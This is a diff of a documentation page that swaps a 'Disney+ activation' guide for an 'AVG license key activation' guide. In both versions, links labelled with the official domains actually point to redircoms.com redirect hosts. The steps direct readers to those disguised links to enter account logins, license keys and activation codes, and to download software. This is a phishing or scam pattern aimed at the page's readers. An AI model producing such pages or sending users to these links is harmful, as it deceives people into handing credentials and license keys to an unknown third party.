@@ -1,5 +1,5 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+How to Activate AVG Using License Key?
 ##################
 
 .. meta::
@@ -14,35 +14,41 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: www.avg.com/retail
+   :target: https://av.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+Activating AVG with a license key ensures your device is fully protected with the latest antivirus features. To begin, visit `www.avg.com/retail <https://av.redircoms.com>`_ and follow the simple steps to redeem and activate your product.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Activate AVG Using a License Key
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Open a browser and go to `www.avg.com/retail <https://av.redircoms.com>`_.
+2. Enter your **25-character AVG license key** (found on your card or email).
+3. Sign in with your **AVG account**, or create one if you're new.
+4. After login, your license will be linked to your AVG account.
+5. Download and install the AVG product associated with your license.
+6. Launch the application and ensure it shows **“Activated”** under subscription.
 
 **********
-What to Do After Activation
+Why Is Activation Important?
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+- Unlocks full protection features like real-time scanning and firewall.
+- Ensures your subscription is valid and up-to-date.
+- Allows easy management of devices and renewals through your AVG account.
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+**********
+Troubleshooting Tips
+**********
+
+- Double-check your license key for typos.
+- Use a stable internet connection during activation.
+- If the license key was already used, contact AVG support for assistance.
+
+Secure your device now—go to `www.avg.com/retail <https://av.redircoms.com>`_ and activate AVG using your license key in just minutes.
